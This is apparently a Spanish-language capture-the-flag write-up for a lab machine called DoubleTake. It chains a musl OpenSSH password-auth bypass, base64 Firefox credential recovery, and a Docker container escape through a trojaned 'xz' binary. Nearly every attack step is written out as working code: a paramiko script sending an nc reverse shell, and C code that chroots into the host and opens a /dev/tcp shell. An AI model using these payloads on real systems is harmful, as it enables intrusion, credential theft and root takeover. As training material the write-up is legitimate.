# Máquina: DoubleTake

**IP:** 10.129.215.234
**OS:** Linux (Alpine, dentro de un contenedor Docker)
**Dificultad:** Easy
**Servicio Clave:** SSH (musl) + plataforma web con despliegue de contenedores
**Fecha:** 2026-11-21
**Skills:** #SSH #musl #AuthBypass #Docker #ContainerEscape #CredentialReuse #Firefox

---
## 1. Reconocimiento

```bash
nmap -p- --min-rate=2000 -T4 10.129.215.234
nmap -p22,80 -sC -sV 10.129.215.234
```

```
22/tcp open  ssh   OpenSSH 10.6 (protocol 2.0)
80/tcp open  http  nginx 1.24.0 (Ubuntu)
| http-auth:
|_  Basic realm=Zentara
```

El puerto 80 está completamente detrás de **HTTP Basic Auth** (realm `Zentara`), sin ninguna ruta accesible sin credenciales (fuzzing de directorios y de subdominios con ffuf no dio nada). Sin credenciales, la web es un callejón sin salida de momento — hay que entrar primero por SSH.

**Pista falsa investigada:** el nombre de la máquina ("DoubleTake") y que Wappalyzer detectara nginx tanto como servidor web como proxy inverso hicieron sospechar de **HTTP Request Smuggling** (ver [[HTTP-Request-Smuggling]]). Se descartó: el nginx delantero devuelve 400 Bad Request inmediato ante cualquier petición con `Content-Length` y `Transfer-Encoding` en conflicto — tiene la protección moderna activada.

---
## 2. Foothold — CVE-2026-123158 (*sshole*)

`OpenSSH 10.6` compilado contra **musl** (no glibc) es vulnerable a un bypass de autenticación por contraseña. Detalle completo del mecanismo en [[SSH-Musl-Crypt-Bypass]].

El usuario objetivo es **`alpine`** — la cuenta de sistema por defecto de las imágenes Alpine Linux, que tiene `*` en `/etc/shadow` igual que `root`, pero **no está restringida por `PermitRootLogin`**.

```bash
sudo pacman -S python-paramiko
```

```python
#!/usr/bin/env python3
import paramiko, sys, time

host, lhost = sys.argv[1], sys.argv[2]
lport = int(sys.argv[3]) if len(sys.argv) > 3 else 9001
pw = "A" * 300

t = paramiko.Transport((host, 22))
t.start_client(timeout=10)

for i in range(1, 7):
    try:
        t.auth_password("alpine", pw)
        print(f"[+] intento {i}: autenticado")
        break
    except paramiko.AuthenticationException:
        print(f"[-] intento {i}: denegado")

if not t.is_authenticated():
    print("[-] fallo"); sys.exit(1)

rev = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
ch = t.open_session()
ch.exec_command(rev)
time.sleep(5)
t.close()
print("[+] enviado")
```

```bash
sudo ufw allow 9001/tcp     # el firewall local bloqueaba el listener en silencio (SYN sin respuesta)
nc -lvnp 9001
python3 sshole.py 10.129.215.234 <IP_VPN_PROPIA> 9001
```

Shell obtenida como `alpine` dentro de un contenedor Docker (`/.dockerenv` presente).

---
## 3. Movimiento Lateral — Credenciales guardadas en Firefox

```bash
find /home/alpine/.mozilla -name "logins.json"
cat /home/alpine/.mozilla/firefox/*/logins.json
```

```json
{"hostname":"http://172.17.0.1","httpRealm":"Zentara",
 "encryptedUsername":"Ym9i",
 "encryptedPassword":"Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==",
 "encType":0}
```

`172.17.0.1` es la puerta de enlace del bridge de Docker (apunta al host). `encType: 0` significa que **no hay contraseña maestra** — el cifrado es solo base64 reversible:

```bash
echo Ym9i | base64 -d                                    # bob
echo Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ== | base64 -d     # CorrectHorseBatteryStaple
```

Esas credenciales sirven tanto para SSH directo (lee la flag de usuario) como para la **web de Zentara** en el puerto 80 (mismo realm `Zentara`):

```bash
ssh bob@10.129.215.234
```

---
## 4. Escalada de Privilegios — CVE-2026-41567 (Docker Archive Binary Hijack)

Login web con `bob:CorrectHorseBatteryStaple` en `http://doubletake.htb` abre **Zentara**, una plataforma de agentes de IA. La pestaña **Status** revela `Docker 29.5.0`. La pestaña **Deploy** sube `.tar`/`.tar.gz`/`.tar.xz` y los extrae server-side, reenviando internamente a `PUT /containers/{id}/archive` de la API de Docker.

Docker < 29.5.1 tiene un fallo de resolución de binarios (ver [[Docker-Archive-Binary-Hijack]]): el daemon, que corre como root del host, resuelve el binario de descompresión (`xz`) **desde el filesystem del contenedor** en vez de usar el suyo propio — y lo ejecuta con sus propios privilegios.

**Plan:**
1. Comprobar que `alpine` no tiene permiso de escritura sobre `/usr/bin/xz` (`-rwxr-xr-x root root`) → hay que plantarlo vía el propio endpoint de deploy, que escribe como root.
2. Compilar un `xz` trampeado que escapa al host via `/proc/1/root` (namespace de PID compartido con el daemon) y abre una reverse shell.
3. Subirlo dentro de un `.tar` **sin comprimir** a `workspace=/`, para que aterrice en `/usr/bin/xz` del contenedor sin necesitar descomprimir nada todavía.
4. Subir un segundo archivo, esta vez `.tar.xz`, para forzar que el daemon invoque el `xz` (ya trampeado) con privilegios de host.

```c
// xz.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {
    mount("proc", "/proc", "proc", 0, NULL);
    chroot("/proc/1/root");
    chdir("/");
    execl("/bin/bash", "bash", "-c",
          "bash -i >& /dev/tcp/<IP_VPN_PROPIA>/4444 0>&1", NULL);
    return 1;
}
```

```bash
gcc -static -o xz xz.c

mkdir -p pkg/usr/bin
cp xz pkg/usr/bin/xz
cd pkg && tar cf ../plant.tar usr/bin/xz
cd ..

curl -u bob:CorrectHorseBatteryStaple \
  -F 'archive=@plant.tar' -F 'workspace=/' \
  http://10.129.215.234/deploy

sudo ufw allow 4444/tcp
nc -lvnp 4444

echo x > t && tar cf - t | xz > trigger.tar.xz
curl -u bob:CorrectHorseBatteryStaple \
  -F 'archive=@trigger.tar.xz' -F 'workspace=/workspace' \
  http://10.129.215.234/deploy
```

El daemon ejecuta el `xz` trampeado como root del host. En la terminal del `nc`:

```
root@doubletake:/# id
uid=0(root) gid=0(root) groups=0(root)
```

---
## Notas / Lecciones

- Cuando una reverse shell no conecta, antes de sospechar de `nc`, comprobar con `tcpdump -i tun0 port PUERTO` si el SYN llega siquiera — si solo hay reintentos sin SYN-ACK/RST, es casi siempre un **firewall local** (`sudo ufw status` / `sudo nft list ruleset`), no el exploit.
- Muchos intentos de login SSH seguidos desde la misma IP activan protecciones anti-fuerza-bruta (conexiones cortadas en seco, `Connection reset`). No sirve de nada insistir — hay que encontrar el usuario por otra vía.
- `encType: 0` en `logins.json` de Firefox = sin contraseña maestra = credenciales en base64 plano, sin necesidad de tocar `key4.db`.
